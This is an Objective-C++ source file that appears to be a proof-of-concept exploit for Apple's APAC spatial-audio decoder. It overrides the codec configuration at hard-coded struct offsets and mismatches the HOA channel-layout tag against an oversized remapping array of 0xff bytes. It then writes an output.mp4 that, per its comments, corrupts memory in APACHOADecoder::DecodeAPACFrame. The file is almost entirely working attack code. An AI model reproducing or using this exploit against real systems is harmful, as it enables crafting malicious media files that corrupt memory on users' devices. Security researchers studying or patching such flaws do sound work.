@import AVFAudio;
@import AudioToolbox;

#include <vector>

struct CodecConfig {
  char padding0[0x78];                         // 0
  AudioChannelLayout* remappingChannelLayout;  // 0x78
  char padding1[0xe0 - 0x80];                  // 0x80
  std::vector<char> mRemappingArray;           // 0xe0
};

void OverrideApac(CodecConfig* config) {
  //The mRemappingArray is sized based on the lower two bytes of mChannelLayoutTag.
  //By creating a mismatch between them, a later stage of processing in APACHOADecoder::DecodeAPACFrame is corrupted.
  //When the APACHOADecoder goes to process the APAC frame (permute it according to the channel remapping array), 
  //for some reason it uses a permutation map that is the size given here in 
  //mChannelLayoutTag, rather than just based on m_totalComponents. 
  config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8;
  
  for (int i = 0; i < 0x10000; i++) {
    config->mRemappingArray.push_back(0xff);
  }
}

int main() {
  //This is the actual number of channels
  uint32_t channelNum = 1;
  AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:44100
                                                                           channels:channelNum];
  AudioStreamBasicDescription outputDescription{.mSampleRate = 44100,
                                                .mFormatID = kAudioFormatAPAC,
                                                .mFormatFlags = 0,
                                                .mBytesPerPacket = 0,
                                                .mFramesPerPacket = 0,
                                                .mBytesPerFrame = 0,
                                                .mChannelsPerFrame = channelNum,
                                                .mBitsPerChannel = 0,
                                                .mReserved = 0};
  AVAudioChannelLayout* channelLayout =
      [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 1];

  NSURL* outUrl = [NSURL fileURLWithPath:@"output.mp4"];

  OSStatus status = 0;

  ExtAudioFileRef audioFile = nullptr;
  status =
      ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileMPEG4Type, &outputDescription,
                                channelLayout.layout, kAudioFileFlags_EraseFile, &audioFile);
  if (status) {
    fprintf(stderr, "error creating file: %x\n", status);
    return 1;
  }

  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                   sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
  if (status) {
    fprintf(stderr, "error writing audiofile: %x\n", status);
    return 1;
  }
  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                   sizeof(AudioChannelLayout), formatIn.channelLayout.layout);
  if (status) {
    fprintf(stderr, "error writing audiofile: %x\n", status);
    return 1;
  }
  float audioBuffer[44100];
  for (int i = 0; i < 44100; ++i) {
      audioBuffer[i] = 0.5f;
  }
  AudioBufferList audioBufferList{
      .mNumberBuffers = 1,
      .mBuffers =
          {
              {
                  .mNumberChannels = 1,
                  .mDataByteSize = sizeof(audioBuffer),
                  .mData = audioBuffer,
              },
          },
  };
  status =
      ExtAudioFileWrite(audioFile, sizeof(audioBuffer) / sizeof(audioBuffer[0]), &audioBufferList);
  if (status) {
    fprintf(stderr, "error writing audiofile: %x\n", status);
    return 1;
  }
  status = ExtAudioFileDispose(audioFile);
  if (status) {
    fprintf(stderr, "error closing audiofile: %x\n", status);
    return 1;
  }
  audioFile = nullptr;
  return 0;
}